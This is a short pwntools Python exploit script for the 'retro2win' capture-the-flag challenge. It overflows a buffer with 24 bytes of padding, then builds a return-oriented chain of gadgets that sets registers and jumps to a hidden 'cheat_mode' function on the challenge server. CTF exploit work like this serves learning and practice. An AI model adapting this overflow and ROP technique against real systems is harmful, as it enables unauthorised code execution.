#!/usr/bin/env python3

from pwn import *

exe = ELF("./retro2win_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("retro2win.ctf.intigriti.io", 1338)

    return r


def main():
    r = conn()
    # rbp - 0x60 = 0x7ffebdf10bf8:
    input()
    # Enter cheat code
    r.sendline(b'1337')
    cheat_mode = 0x0000000000400736
    pop_rdi = 0x00000000004009b3
    pop_rsi_r15 = 0x00000000004009b1
    payload =b'A'*24
    pause()
    # Control rdi and rsi register and return to cheatmode
    payload += p64(pop_rdi) + p64(0x2323232323232323) + p64(pop_rsi_r15) + p64(0x4242424242424242) + p64(0) + p64(cheat_mode)
    r.sendline(payload)
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
